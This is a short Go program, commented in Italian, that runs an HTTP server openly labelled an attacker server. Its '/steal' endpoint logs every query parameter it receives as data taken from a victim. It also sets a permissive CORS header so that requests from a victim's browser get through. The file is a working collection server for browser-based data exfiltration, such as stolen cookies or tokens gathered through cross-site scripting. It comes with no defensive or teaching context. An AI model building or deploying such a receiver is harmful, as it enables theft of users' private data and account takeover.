package main

import (
	"fmt"
	"log"
	"net/http"
)

func main() {
	http.HandleFunc("/steal", func(w http.ResponseWriter, r *http.Request) {
		q := r.URL.Query()
		fmt.Println("\n[!] DATI RICEVUTI DALLA VITTIMA:")
		for k, v := range q {
			fmt.Printf("  %s: %s\n", k, v[0])
		}
		// CORS necessario perché la richiesta viene dal browser della vittima
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.WriteHeader(http.StatusOK)
	})

	fmt.Println("[*] Attacker server in ascolto su :9999")
	log.Fatal(http.ListenAndServe(":9999", nil))
}
